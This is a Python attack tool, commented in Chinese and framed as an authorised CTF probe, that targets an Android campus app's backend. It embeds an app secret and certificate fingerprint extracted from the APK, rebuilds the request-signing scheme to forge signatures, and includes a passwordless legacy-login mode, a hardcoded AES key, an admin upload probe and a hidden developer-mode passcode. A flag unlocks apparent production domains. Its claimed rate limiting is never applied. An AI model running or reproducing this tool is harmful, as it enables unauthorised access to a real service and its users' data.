#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 实际值版本：仅限已获书面授权的环境。
# Extract your own values from the APK; use only in authorized environments.
"""
TSN CTF 探测/验证工具（仅限授权靶场）

安全设计：
  * 默认 dry-run，只打印将要发送的请求与 curl 等价命令
  * 真正发送必须同时提供 --execute 与 --authorized
  * 目标为已知生产域名时，还必须额外提供 --allow-production-domain
  * 全局限速 1 req/s，单次运行最多 5 个请求

用法示例（靶场）：
  python3 tsn_ctf_probe.py --target http://10.0.0.5:8080 --mode oldtsn --username admin --execute --authorized
  python3 tsn_ctf_probe.py --target http://10.0.0.5:8080 --mode oauth --username admin --password 123456 --execute --authorized
  python3 tsn_ctf_probe.py --target http://10.0.0.5:8080 --mode signed-version --school-id 1 --execute --authorized
  python3 tsn_ctf_probe.py --target http://10.0.0.5:8080 --mode signed-upload --execute --authorized
  python3 tsn_ctf_probe.py --target http://10.0.0.5:8080 --mode schools --execute --authorized
"""

import argparse
import os
import base64
import gzip
import hashlib
import json
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

APP_ID = "move"
APP_SECRET = "e8167ef026cbc5e456ab837d9d6d9254"
CERT_FP = "7F:C0:22:E6:7C:7D:2A:CC:C3:C8:77:0A:46:13:8D:C3"

PROD_HOSTS = {"a.tsnkj.com", "m.boxkj.com", "h.tsnkj.com"}

MAX_REQUESTS = 5
SLEEP_BETWEEN = 1.0

_req_count = 0


def ts_ms() -> str:
    return str(int(time.time() * 1000))


def md5hex(s: str) -> str:
    return hashlib.md5(s.encode("utf-8")).hexdigest()


def build_signed(
    params: dict,
    app_id: str = APP_ID,
    app_secret: str = APP_SECRET,
    timestamp: str = None,
    verbose: bool = False,
):
    """复刻 2.0.22 com/bxkj/base/intercept/a.java 的签名逻辑。

    签名串 = MD5( 字典序 "k=v&..." )，参与字段 = 原始参数 + appId + timestamp + appSecret
    请求体 = 原始参数 + timestamp + sign（注意：不回填 appId/appSecret）
    """
    ts = timestamp or ts_ms()
    base = {k: str(v) for k, v in params.items() if k != "sign"}
    sign_map = dict(base)
    sign_map["appId"] = app_id
    sign_map["timestamp"] = ts
    sign_map["appSecret"] = app_secret
    concat = "&".join(f"{k}={sign_map[k]}" for k in sorted(sign_map))
    sign = md5hex(concat)
    body = dict(base)
    body["timestamp"] = ts
    body["sign"] = sign
    if verbose:
        print(f"    [sign] concat = {concat}")
        print(f"    [sign] md5    = {sign}")
    return body, concat, sign


def aes_password(pwd: str) -> str:
    """Pig4Cloud 传输加密：AES-128-CBC，key=iv='thanks,pig4cloud'，ZeroPadding，Base64"""
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    key = iv = b"thanks,pig4cloud"
    data = pwd.encode("utf-8")
    pad = 16 - len(data) % 16
    data += b"\x00" * pad
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    return base64.b64encode(enc.update(data) + enc.finalize()).decode()


def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def http_request(
    method: str,
    url: str,
    body: bytes = None,
    headers: dict = None,
    timeout: int = 15,
    dry: bool = True,
):
    global _req_count
    h = dict(headers or {})
    if body is not None and "Content-Type" not in h and not h.get("_multipart"):
        h["Content-Type"] = "application/x-www-form-urlencoded"

    # curl 等价命令（便于人工复核/复现）
    parts = [f"curl -sk -X {method} '{url}'"]
    for k, v in h.items():
        if k == "_multipart":
            continue
        parts.append(f"  -H '{k}: {v}'")
    if body is not None and not h.get("_multipart"):
        parts.append(f"  --data '{body.decode('utf-8', 'replace')}'")
    elif body is not None:
        parts.append("  --data-binary @<multipart-body>")
    print("    " + " \\\n    ".join(parts))

    if dry:
        print("    [dry-run] 未发送")
        return None, None

    _req_count += 1
    if _req_count > MAX_REQUESTS:
        raise SystemExit(f"[!] 已达单次运行请求上限 {MAX_REQUESTS}，中止")

    req = urllib.request.Request(
        url,
        data=body,
        headers={k: v for k, v in h.items() if k != "_multipart"},
        method=method,
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            raw = r.read(30000)
            if "gzip" in (r.headers.get("Content-Encoding") or "").lower():
                try:
                    raw = gzip.decompress(raw)
                except Exception:
                    pass
            return r.status, raw.decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        raw = e.read(30000)
        if "gzip" in (e.headers.get("Content-Encoding") or "").lower():
            try:
                raw = gzip.decompress(raw)
            except Exception:
                pass
        return e.code, raw.decode("utf-8", "replace")
    except Exception as e:
        return None, f"ERR {type(e).__name__}: {e}"


def form_body(data: dict) -> bytes:
    return urllib.parse.urlencode(data).encode("utf-8")


def multipart_body(
    fields: dict, file_field: str, filename: str, content: bytes, content_type: str
):
    boundary = "----TSNCTF" + uuid.uuid4().hex
    out = bytearray()
    for k, v in fields.items():
        out += (
            f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'
        ).encode("utf-8")
    out += (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{file_field}"; filename="{filename}"\r\n'
        f"Content-Type: {content_type}\r\n\r\n"
    ).encode("utf-8")
    out += content
    out += f"\r\n--{boundary}--\r\n".encode("utf-8")
    return bytes(out), f"multipart/form-data; boundary={boundary}"


def base_headers(token: str = "", version: str = "20220", utype: str = "0") -> dict:
    return {
        "token": token,
        "channel": "Android",
        "version": version,
        "type": utype,
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.9.0",
    }


def check_target(target: str, args):
    host = urllib.parse.urlparse(target).hostname or ""
    if host in PROD_HOSTS and not getattr(args, "allow_production_domain", False):
        print(f"[!] 目标 {host} 是已知生产域名。")
        print(
            "    未授权测试生产系统可能违法。若你持有书面授权，请加 --allow-production-domain。"
        )
        print(
            "    更推荐：把靶场域名写入 /etc/hosts 指向靶场 IP，或直接使用靶场 IP:端口。"
        )
        raise SystemExit(2)
    if host in PROD_HOSTS and getattr(args, "allow_production_domain", False):
        print(f"[!!] 已显式允许生产域名 {host} —— 请确认你持有书面授权，风险自负。")


# ---------------- modes ----------------


def mode_oldtsn(args):
    """旧系统迁移登录：username + type=oldtsn，无 password"""
    print(
        f"[*] 模式 oldtsn：{args.target}/auth/oauth/token  username={args.username} type=oldtsn"
    )
    url = args.target.rstrip("/") + "/auth/oauth/token"
    data = {
        "username": args.username,
        "grant_type": "password",
        "type": "oldtsn",
        "appType": "stuApp",
    }
    qs = {}
    if args.code:
        qs["code"] = args.code
    if args.random_str:
        qs["randomStr"] = args.random_str
    if qs:
        url += ("&" if "?" in url else "?") + urllib.parse.urlencode(qs)
    if args.with_sign:
        data, _, _ = build_signed(data, verbose=args.verbose)
    headers = base_headers(token=args.token)
    headers["Authorization"] = (
        "Basic " + base64.b64encode(f"{args.school_code}:pig".encode()).decode()
    )
    headers["model"] = args.model
    code, text = http_request(
        "POST", url, form_body(data), headers, dry=not args.execute
    )
    report(code, text)


def mode_oauth(args):
    """Pig4Cloud 密码登录（单次；密码 AES 加密）"""
    print(f"[*] 模式 oauth：{args.target}/auth/oauth/token  username={args.username}")
    url = args.target.rstrip("/") + "/auth/oauth/token"
    data = {
        "username": args.username,
        "password": aes_password(args.password),
        "grant_type": "password",
        "type": args.oauth_type,
        "appType": "stuApp",
    }
    if args.code:
        data["code"] = args.code
    if args.random_str:
        data["randomStr"] = args.random_str
    if args.with_sign:
        data, _, _ = build_signed(data, verbose=args.verbose)
    headers = base_headers(token=args.token)
    headers["Authorization"] = (
        "Basic " + base64.b64encode(f"{args.school_code}:pig".encode()).decode()
    )
    headers["model"] = args.model
    code, text = http_request(
        "POST", url, form_body(data), headers, dry=not args.execute
    )
    report(code, text)


def mode_signed_version(args):
    """<ADMIN_BACKEND> 风格 /admin 接口：版本检查（签名伪造）"""
    print(f"[*] 模式 signed-version：{args.base}/admin/studentAppUpdate/stuAppVersion2")
    url = args.base.rstrip("/") + "/admin/studentAppUpdate/stuAppVersion2"
    params = {"schoolId": args.school_id, "appSign": CERT_FP}
    body, _, _ = build_signed(params, verbose=args.verbose)
    code, text = http_request(
        "POST",
        url,
        form_body(body),
        base_headers(token=args.token),
        dry=not args.execute,
    )
    report(code, text)


def mode_signed_upload(args):
    """<ADMIN_BACKEND> 风格 /admin 文件上传：无害探针"""
    print(f"[*] 模式 signed-upload：{args.base}/admin/userAppLogFile/addLogData")
    url = args.base.rstrip("/") + "/admin/userAppLogFile/addLogData"
    fields = {
        "note": "TSN CTF probe",
        "schoolCode": args.school_code,
        "userNum": args.user_id,
        "appType": "Android",
        "versionCode": "20220",
        "versionName": args.app_version,
        "signatureMD5": "7fc022e67c7d2accc3c8770a46138dc3",
        "brand": "Google",
        "model": args.model,
    }
    body_fields, _, _ = build_signed(fields, verbose=args.verbose)
    # 无害探针：仅计算表达式，不是 webshell
    content = b"TSN-CTF-PROBE 31337*3 = 94011\n"
    mp, ctype = multipart_body(
        body_fields, "files", "tsn_probe.txt", content, "text/plain"
    )
    headers = base_headers(token=args.token)
    headers["Content-Type"] = ctype
    headers["_multipart"] = "1"
    code, text = http_request("POST", url, mp, headers, dry=not args.execute)
    report(code, text)


def mode_schools(args):
    """旧后台学校列表（签名）"""
    print(f"[*] 模式 schools：{args.base}/app/sch/listSchoolByProvinceId")
    url = args.base.rstrip("/") + "/app/sch/listSchoolByProvinceId"
    params = {"provinceId": args.province_id}
    body, _, _ = build_signed(params, verbose=args.verbose)
    code, text = http_request(
        "POST",
        url,
        form_body(body),
        base_headers(token=args.token),
        dry=not args.execute,
    )
    report(code, text)


def mode_school_detail(args):
    """学校详情（签名）"""
    print(f"[*] 模式 school-detail：{args.base}/app/sch/getSchoolById")
    url = args.base.rstrip("/") + "/app/sch/getSchoolById"
    params = {"schoolId": args.school_id}
    body, _, _ = build_signed(params, verbose=args.verbose)
    code, text = http_request(
        "POST",
        url,
        form_body(body),
        base_headers(token=args.token),
        dry=not args.execute,
    )
    report(code, text)


def mode_permission(args):
    """权限查询（旧后台）"""
    print(f"[*] 模式 permission：{args.base}/api/permission/getPermission")
    url = args.base.rstrip("/") + "/api/permission/getPermission"
    params = {"schoolId": args.school_id, "userNum": args.username, "pid": args.pid}
    body, _, _ = build_signed(params, verbose=args.verbose)
    code, text = http_request(
        "POST",
        url,
        form_body(body),
        base_headers(token=args.token),
        dry=not args.execute,
    )
    report(code, text)


def mode_devmode(args):
    """开发者模式（本地 APP 操作，不发请求）"""
    print("""[*] 开发者模式（本地 APP，无需网络）
  1. 打开「我的」→「关于我们」（或登录页）长按指定控件；
  2. 弹窗输入口令：396436
  3. 确认开启后，LoginUser.openModel=true；
  4. 之后每次 HTTP 请求/响应都会弹窗显示 URL、参数、状态码、响应体（可复制）。
  用途：观察隐藏接口、token、服务端返回，属于「普通用户外」的调试权限。
""")


def report(code, text):
    if code is None:
        print(f"    [结果] {text}")
        return
    print(f"    [HTTP {code}]")
    if text:
        print("    " + text[:2000].replace("\n", "\n    "))


def main():
    p = argparse.ArgumentParser(description="TSN CTF 探测工具（仅授权靶场）")
    p.add_argument("--target", default="", help="业务后端根，如 http://10.0.0.5:8080")
    p.add_argument("--base", default="", help="旧后台根（默认同 --target）")
    p.add_argument(
        "--mode",
        required=True,
        choices=[
            "oldtsn",
            "oauth",
            "signed-version",
            "signed-upload",
            "schools",
            "school-detail",
            "permission",
            "devmode",
        ],
    )
    p.add_argument("--username", default="admin")
    p.add_argument("--password", default="123456")
    p.add_argument("--school-code", default="tsn", help="OAuth client_id（学校 code）")
    p.add_argument("--school-id", default="1")
    p.add_argument("--province-id", default="1")
    p.add_argument("--user-id", default="1")
    p.add_argument("--app-version", default="2.0.22")
    p.add_argument("--pid", default="0")
    p.add_argument("--oauth-type", default="app", help="app / oldtsn")
    p.add_argument("--model", default="Pixel-7")
    p.add_argument("--app-id", default=APP_ID)
    p.add_argument("--code", default="")
    p.add_argument("--random-str", default="")
    p.add_argument("--token", default="")
    p.add_argument("--with-sign", action="store_true", help="OAuth 请求也附加应用签名")
    p.add_argument("--verbose", action="store_true")
    p.add_argument("--execute", action="store_true", help="真正发送请求")
    p.add_argument("--authorized", action="store_true", help="声明已获得书面授权")
    p.add_argument(
        "--allow-production-domain",
        action="store_true",
        help="允许目标为已知生产域名（高风险，需书面授权）",
    )
    args = p.parse_args()

    if not args.base:
        args.base = args.target

    if args.mode == "devmode":
        mode_devmode(args)
        return

    if not args.target:
        raise SystemExit("缺少 --target")

    check_target(args.target, args)
    if args.base and args.base != args.target:
        check_target(args.base, args)

    if args.execute and not args.authorized:
        raise SystemExit("发送请求需同时提供 --authorized（声明已获授权）")

    print(f"[*] execute={args.execute} authorized={args.authorized}")
    dispatch = {
        "oldtsn": mode_oldtsn,
        "oauth": mode_oauth,
        "signed-version": mode_signed_version,
        "signed-upload": mode_signed_upload,
        "schools": mode_schools,
        "school-detail": mode_school_detail,
        "permission": mode_permission,
    }
    dispatch[args.mode](args)
    if args.execute:
        print(f"[*] 本次已发送 {_req_count} 个请求（限速 {SLEEP_BETWEEN}s/请求）")


if __name__ == "__main__":
    main()
